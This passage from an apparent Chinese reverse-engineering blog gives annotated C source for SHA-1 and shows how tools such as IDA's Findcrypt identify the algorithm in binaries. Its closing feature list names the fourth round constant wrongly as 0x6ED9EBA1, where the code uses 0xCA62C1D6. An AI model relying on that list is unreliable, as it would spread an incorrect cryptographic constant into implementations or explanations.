69);R4(a, b, c, d, e, 70);R4(e, a, b, c, d, 71);</span><br><span class="line">R4(d, e, a, b, c, 72);R4(c, d, e, a, b, 73);R4(b, c, d, e, a, 74);R4(a, b, c, d, e, 75);</span><br><span class="line">R4(e, a, b, c, d, 76);R4(d, e, a, b, c, 77);R4(c, d, e, a, b, 78);R4(b, c, d, e, a, 79);</span><br></pre></td></tr></table></figure><h2 id="6-输出"><a href="#6-输出" class="headerlink" title="6 输出"></a>6 输出</h2><p>运算结束，将ABCDE合并输出</p><h1 id="二-源码实现"><a href="#二-源码实现" class="headerlink" title="二 源码实现"></a>二 源码实现</h1><p>sha1.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHA1_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHA1_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHA1HANDSOFF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LITTLE_ENDIAN</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>];<span class="comment">/* 160(5×32)比特的消息摘要（即SHA-1算法要得出的） */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> count[<span class="number">2</span>];<span class="comment">/* 储存消息的长度（单位：比特） */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>];<span class="comment">/* 512(64×8)比特（位）的消息块（由原始消息经处理得出） */</span></span><br><span class="line">&#125; SHA1_CTX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Init</span><span class="params">(SHA1_CTX *context)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Update</span><span class="params">(SHA1_CTX *context, <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Final</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">20</span>], SHA1_CTX *context)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>sha1.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c[<span class="number">64</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> l[<span class="number">16</span>];</span><br><span class="line">&#125; CHAR64LONG16;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rol(value, bits) (((value) <span class="string">&lt;&lt; (bits)) | ((value) &gt;</span>&gt; (32 - (bits))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   blk0()   and   blk()   perform   the   initial   expand.   */</span></span><br><span class="line"><span class="comment">/*   I   got   the   idea   of   expanding   during   the   round   function   from   SSLeay   */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LITTLE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk0(i) (block-&gt;l[i] = (rol(block-&gt;l[i], 24) &amp; 0xFF00FF00) | (rol(block-&gt;l[i], 8) &amp; 0x00FF00FF))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk0(i) block-&gt;l[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> blk(i) (block-&gt;l[i &amp; 15] = rol(block-&gt;l[(i + 13) &amp; 15] ^ block-&gt;l[(i + 8) &amp; 15] ^ block-&gt;l[(i + 2) &amp; 15] ^ block-&gt;l[i &amp; 15], 1))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   (R0+R1),   R2,   R3,   R4   are   the   different   operations   used   in   SHA1   */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R0(v, w, x, y, z, i)                                     \</span></span><br><span class="line"><span class="meta">z += ((w &amp; (x ^ y)) ^ y) + blk0(i) + 0x5A827999 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R1(v, w, x, y, z, i)                                    \</span></span><br><span class="line"><span class="meta">z += ((w &amp; (x ^ y)) ^ y) + blk(i) + 0x5A827999 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R2(v, w, x, y, z, i)                            \</span></span><br><span class="line"><span class="meta">z += (w ^ x ^ y) + blk(i) + 0x6ED9EBA1 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R3(v, w, x, y, z, i)                                          \</span></span><br><span class="line"><span class="meta">z += (((w | x) &amp; y) | (w &amp; x)) + blk(i) + 0x8F1BBCDC + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R4(v, w, x, y, z, i)                            \</span></span><br><span class="line"><span class="meta">z += (w ^ x ^ y) + blk(i) + 0xCA62C1D6 + rol(v, 5); \</span></span><br><span class="line"><span class="meta">w = rol(w, 30);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">SHA1Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>], <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>])</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Hash   a   single   512-bit   block.   This   is   the   core   of   the   algorithm.   */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">SHA1Transform</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> state[<span class="number">5</span>], <span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">64</span>])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> a, b, c, d, e;</span><br><span class="line">CHAR64LONG16 *block;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHA1HANDSOFF</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> workspace[<span class="number">64</span>];</span><br><span class="line">block = (CHAR64LONG16 *)workspace;</span><br><span class="line"><span class="built_in">memcpy</span>(block, buffer, <span class="number">64</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">block = (CHAR64LONG16 *)buffer;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Copy   context-&gt; state[]   to   working   vars   */</span></span><br><span class="line">a = state[<span class="number">0</span>];</span><br><span class="line">b = state[<span class="number">1</span>];</span><br><span class="line">c = state[<span class="number">2</span>];</span><br><span class="line">d = state[<span class="number">3</span>];</span><br><span class="line">e = state[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完成的就是RFC文档中的H0～H4赋值给ABCDE的操作。接下来就是80轮运算的代码。每20轮为一组，共分四组 */</span></span><br><span class="line"><span class="comment">/* 第一组比较特殊，使用了R0和R1两个宏函数，其原因前面已经介绍了。因为第0~15轮运算和16~79轮运算的时候消息块M(i)和字块W(i)的转换是不一样的。后面的20~39轮，40~59轮，60~79轮就是依次使用的R2，R3，R4来运算了 */</span></span><br><span class="line"><span class="comment">/*   4   rounds   of   20   operations   each.   Loop   unrolled.   */</span></span><br><span class="line">R0(a, b, c, d, e, <span class="number">0</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">1</span>);</span><br><span class="line">R0(d, e, a, b, c, <span class="number">2</span>);</span><br><span class="line">R0(c, d, e, a, b, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">R0(b, c, d, e, a, <span class="number">4</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">5</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">6</span>);</span><br><span class="line">R0(d, e, a, b, c, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">R0(c, d, e, a, b, <span class="number">8</span>);</span><br><span class="line">R0(b, c, d, e, a, <span class="number">9</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">10</span>);</span><br><span class="line">R0(e, a, b, c, d, <span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">R0(d, e, a, b, c, <span class="number">12</span>);</span><br><span class="line">R0(c, d, e, a, b, <span class="number">13</span>);</span><br><span class="line">R0(b, c, d, e, a, <span class="number">14</span>);</span><br><span class="line">R0(a, b, c, d, e, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">R1(e, a, b, c, d, <span class="number">16</span>);</span><br><span class="line">R1(d, e, a, b, c, <span class="number">17</span>);</span><br><span class="line">R1(c, d, e, a, b, <span class="number">18</span>);</span><br><span class="line">R1(b, c, d, e, a, <span class="number">19</span>);</span><br><span class="line"></span><br><span class="line">R2(a, b, c, d, e, <span class="number">20</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">21</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">22</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">R2(b, c, d, e, a, <span class="number">24</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">25</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">26</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">27</span>);</span><br><span class="line"></span><br><span class="line">R2(c, d, e, a, b, <span class="number">28</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">29</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">30</span>);</span><br><span class="line">R2(e, a, b, c, d, <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">R2(d, e, a, b, c, <span class="number">32</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">33</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">34</span>);</span><br><span class="line">R2(a, b, c, d, e, <span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">R2(e, a, b, c, d, <span class="number">36</span>);</span><br><span class="line">R2(d, e, a, b, c, <span class="number">37</span>);</span><br><span class="line">R2(c, d, e, a, b, <span class="number">38</span>);</span><br><span class="line">R2(b, c, d, e, a, <span class="number">39</span>);</span><br><span class="line"></span><br><span class="line">R3(a, b, c, d, e, <span class="number">40</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">41</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">42</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">43</span>);</span><br><span class="line"></span><br><span class="line">R3(b, c, d, e, a, <span class="number">44</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">45</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">46</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">47</span>);</span><br><span class="line"></span><br><span class="line">R3(c, d, e, a, b, <span class="number">48</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">49</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">50</span>);</span><br><span class="line">R3(e, a, b, c, d, <span class="number">51</span>);</span><br><span class="line"></span><br><span class="line">R3(d, e, a, b, c, <span class="number">52</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">53</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">54</span>);</span><br><span class="line">R3(a, b, c, d, e, <span class="number">55</span>);</span><br><span class="line"></span><br><span class="line">R3(e, a, b, c, d, <span class="number">56</span>);</span><br><span class="line">R3(d, e, a, b, c, <span class="number">57</span>);</span><br><span class="line">R3(c, d, e, a, b, <span class="number">58</span>);</span><br><span class="line">R3(b, c, d, e, a, <span class="number">59</span>);</span><br><span class="line"></span><br><span class="line">R4(a, b, c, d, e, <span class="number">60</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">61</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">62</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">63</span>);</span><br><span class="line"></span><br><span class="line">R4(b, c, d, e, a, <span class="number">64</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">65</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">66</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">67</span>);</span><br><span class="line"></span><br><span class="line">R4(c, d, e, a, b, <span class="number">68</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">69</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">70</span>);</span><br><span class="line">R4(e, a, b, c, d, <span class="number">71</span>);</span><br><span class="line"></span><br><span class="line">R4(d, e, a, b, c, <span class="number">72</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">73</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">74</span>);</span><br><span class="line">R4(a, b, c, d, e, <span class="number">75</span>);</span><br><span class="line"></span><br><span class="line">R4(e, a, b, c, d, <span class="number">76</span>);</span><br><span class="line">R4(d, e, a, b, c, <span class="number">77</span>);</span><br><span class="line">R4(c, d, e, a, b, <span class="number">78</span>);</span><br><span class="line">R4(b, c, d, e, a, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完成的就是更新缓冲区H0～H4的内容。然后把a～e清空为0 */</span></span><br><span class="line"><span class="comment">/*   Add   the   working   vars   back   into   context.state[]   */</span></span><br><span class="line">state[<span class="number">0</span>] += a;</span><br><span class="line">state[<span class="number">1</span>] += b;</span><br><span class="line">state[<span class="number">2</span>] += c;</span><br><span class="line">state[<span class="number">3</span>] += d;</span><br><span class="line">state[<span class="number">4</span>] += e;</span><br><span class="line"><span class="comment">/*   Wipe   variables   */</span></span><br><span class="line">a = b = c = d = e = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   SHA1Init   -   Initialize   new   context   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Init</span><span class="params">(SHA1_CTX *context)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*   SHA1   initialization   constants   */</span></span><br><span class="line">context-&gt;state[<span class="number">0</span>] = <span class="number">0x67452301</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">1</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">2</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">3</span>] = <span class="number">0x10325476</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;state[<span class="number">4</span>] = <span class="number">0xC3D2E1F0</span>;</span><br><span class="line"></span><br><span class="line">context-&gt;count[<span class="number">0</span>] = context-&gt;count[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Run   your   data   through   this.   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Update</span><span class="params">(SHA1_CTX *context, <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   j&gt;&gt;3获得的就是字节数，j = (j &gt;&gt; 3) &amp; 63得到的就是低6位的值，也就是代表64个字节（512位）长度的消息。，因为我们每次进行计算都是处理512位的消息数据。 */</span></span><br><span class="line">j = (context-&gt;count[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">63</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* context-&gt;count[ ]存储的是消息的长度，超出context-&gt;count[0]的存储范围的部分存储在context-&gt;count[1]中。len&lt;&lt;3就是len*8的意思，因为len的单位是字节，而context-&gt;count[ ]存储的长度的单位是位，所以要乘以8。 if ((context-&gt;count[0] += len &lt;&lt; 3) &lt; j) 的意思就是说如果加上len*8个位，context-&gt;count[0]溢出了，那么就要：context-&gt;count[1]++；进位。</span></span><br><span class="line"><span class="comment">len&lt;&lt;3的单位是位，len&gt;&gt;29（len&lt;&lt;3 &gt;&gt;32）表示的就是len中要存储在context-&gt;count[1]中的部分。 */</span></span><br><span class="line"><span class="keyword">if</span> ((context-&gt;count[<span class="number">0</span>] += len &lt;&lt; <span class="number">3</span>) &lt; (len &lt;&lt; <span class="number">3</span>))</span><br><span class="line">context-&gt;count[<span class="number">1</span>]++;</span><br><span class="line"></span><br><span class="line">context-&gt;count[<span class="number">1</span>] += (len &gt;&gt; <span class="number">29</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果j+len的长度大于63个字节，就分开处理，每64个字节处理一次，然后再处理后面的64个字节，重复这个过程；否则就直接将数据附加到buffer末尾 */</span></span><br><span class="line"><span class="keyword">if</span> ((j + len) &gt; <span class="number">63</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[j], data, (i = <span class="number">64</span> - j));<span class="comment">/* i=64-j，然后从data中复制i个字节的数据附加到context-&gt;buffer[j]末尾，也就是说给buffer凑成了64个字节 */</span></span><br><span class="line">SHA1Transform(context-&gt;state, context-&gt;buffer);<span class="comment">/* 执行SHA1Transform()来开始一次消息摘要的计算 */</span></span><br><span class="line"><span class="comment">/* 每64个字节处理一次 */</span></span><br><span class="line"><span class="keyword">for</span> (; i + <span class="number">63</span> &lt; len; i += <span class="number">64</span>)</span><br><span class="line">&#123;</span><br><span class="line">SHA1Transform(context-&gt;state, &amp;data[i]);</span><br><span class="line">&#125;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果前面的if不成立，那么也就是说原始数据context-&gt;buffer加上新的数据data的长度还不足以凑成64个字节，所以直接附加上data就行了。相当于：memcpy(&amp;context-&gt;buffer[j], &amp;data[i], 0);</span></span><br><span class="line"><span class="comment">如果前面的if成立，那么j是等于0的，而 i 所指向的偏移位置是 (└ len/64┘×64,len)之间。 └   ┘表示向下取整。*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;context-&gt;buffer[j], &amp;data[i], len - i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Add   padding   and   return   the   message   digest.   */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">SHA1Final</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> digest[<span class="number">20</span>], SHA1_CTX *context)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> i, j;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> finalcount[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">finalcount[i] = (<span class="type">unsigned</span> <span class="type">char</span>)((context-&gt;count[(i &gt;= <span class="number">4</span> ? <span class="number">0</span> : <span class="number">1</span>)]</span><br><span class="line"> &gt;&gt; ((<span class="number">3</span> - (i &amp; <span class="number">3</span>)) * <span class="number">8</span>)) &amp;</span><br><span class="line"><span class="number">255</span>); <span class="comment">/*   Endian   independent   */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 填充的时候是以字节为单位的，最少1个字节，最多64个字节。并且第一位要填充1，后面都填充0。所以拿到一个消息我们首先要给他填充一个字节的10 000 000.SHA1Update() 函数就是完成的数据填充（附加）操作 */</span></span><br><span class="line">SHA1Update(context, (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="string">&quot;\200 &quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 循环测试数据模512是否与448同余。不满足条件就填充全一个字节0。 */</span></span><br><span class="line"><span class="comment">/* 使用 while ((context-&gt;count[0] &amp; 511) != 448) 貌似更合适。但是，504后三位全0,511后三位全1。context-&gt;count中存储的是消息的长度，它的单位是：位。前面我们提到了我们的数据是以字节来存储的，所以context-&gt;count[ ]中的数据肯定是8个倍数，所以后三位肯定是000。所以不管是000&amp;000，还是000&amp;111其结果都是0。 */</span></span><br><span class="line"><span class="keyword">while</span> ((context-&gt;count[<span class="number">0</span>] &amp; <span class="number">504</span>) != <span class="number">448</span>)</span><br><span class="line">&#123;</span><br><span class="line">SHA1Update(context, (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="string">&quot;\0 &quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这将触发SHA1Transform()函数的调用，该函数的功能就是进行运算，得出160位的消息摘要（message digest）并储存在context-state[ ]中，它是整个SHA-1算法的核心 */</span></span><br><span class="line">SHA1Update(context, finalcount, <span class="number">8</span>); <span class="comment">/*   Should   cause   a   SHA1Transform()   */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最后的这步转换将消息摘要转换成单字节序列。用代码来解释就是：将context-state[5]中储存的20个字节（5×4字节）的消息摘要取出，将其存储在20个单字节的数组digest中。并且按大端序存储（与之前分析context-&gt;count[ ]到finalcount[ ]转换的思路相同） */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">digest[i] = (<span class="type">unsigned</span> <span class="type">char</span>)</span><br><span class="line"></span><br><span class="line">((context-&gt;state[i &gt;&gt; <span class="number">2</span>] &gt;&gt; ((<span class="number">3</span> - (i &amp; <span class="number">3</span>)) * <span class="number">8</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*   Wipe   variables   */</span></span><br><span class="line">i = j = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;buffer, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;state, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">memset</span>(context-&gt;count, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(&amp;finalcount, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHA1HANDSOFF <span class="comment">/*   make   SHA1Transform   overwrite   it &#x27;s   own   static   vars   */</span></span></span><br><span class="line">SHA1Transform(context-&gt;state, context-&gt;buffer);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    SHA1_CTX ctx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> hash[<span class="number">20</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> abc[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="comment">/* 计算前，先初始化 */</span></span><br><span class="line">    SHA1Init(&amp;ctx);</span><br><span class="line">    <span class="comment">/* 多次调用 SHA1Update 循环计算多个包数据（如果有的话） */</span></span><br><span class="line">    SHA1Update(&amp;ctx, abc, <span class="built_in">strlen</span>(abc));</span><br><span class="line">    <span class="comment">/* 最后调用 SHA1Final 获取最终结果 */</span></span><br><span class="line">    SHA1Final(hash, &amp;ctx);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2.2x&quot;</span>, hash[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三-汇编分析识别sha1算法"><a href="#三-汇编分析识别sha1算法" class="headerlink" title="三 汇编分析识别sha1算法"></a>三 汇编分析识别sha1算法</h1><p>参考如下文章：</p><p><a href="https://blog.csdn.net/abel_big_xu/article/details/115620883">逆向分析中的密码学—SHA1_sha1逆向-CSDN博客</a></p><hr><p>使用PEid带的Krypto ANALyzer还是可以识别到程序使用了sha1</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171357388.png" alt="image-20240617135701343"> </p><p>使用ida pro的插件Findcrypt能够识别到初始化常数ABCDE和主循环常数K</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171357637.png" alt="image-20240617135734567"> </p><h2 id="1-算法识别"><a href="#1-算法识别" class="headerlink" title="1 算法识别"></a>1 算法识别</h2><p>main函数主要包括下面3个步骤。</p><ol><li>SHA1init</li><li>SHA1Update</li><li>SHA1Final</li></ol><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171358979.png" alt="image-20240617135830941"> </p><h3 id="SHA1init"><a href="#SHA1init" class="headerlink" title="SHA1init"></a>SHA1init</h3><p>初始化ABCDE，并将长度置为0</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171358067.png" alt="在这里插入图片描述"> </p><h3 id="SHA1Update"><a href="#SHA1Update" class="headerlink" title="SHA1Update"></a><strong>SHA1Update</strong></h3><p>循环将将每个512bit的chunk进行80轮的运算</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171359047.png" alt="在这里插入图片描述"> </p><h3 id="SHA1Final"><a href="#SHA1Final" class="headerlink" title="SHA1Final"></a><strong>SHA1Final</strong></h3><p>最后填充数据和添加消息长度，进入最后的hash计算</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171359435.png" alt="在这里插入图片描述"> </p><h2 id="2-总结"><a href="#2-总结" class="headerlink" title="2 总结"></a>2 总结</h2><p>sha1哈希计算，先进行数据填充，再补上消息长度，只后每512bit进行80轮的hash计算，最后将最后的ABCDE拼接得到160位的hash值</p><p><strong>sha1特征</strong></p><ul><li>初始化常数ABCDE（0x67452301、0xEFCDAB89、0x98BADCFE、0x10325476、0xC3D2E1F0）</li><li>常数K1、K2、K2、K3、K4，0x5A827999、0x6ED9EBA1、0x8F1BBCDC、0x6ED9EBA1</li><li>80轮hash计算中W[i]的生成，前16轮由512位的输入得到，后W[16-79]由前面的W生成得到</li><li>4组基本轮函数F1,F2,F3,F4</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> 哈希算法 </tag>
            
            <tag> sha1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之MD5</title>
      <link href="/2024/06/15/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BMD5/"/>
      <url>/2024/06/15/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BMD5/</url>
      
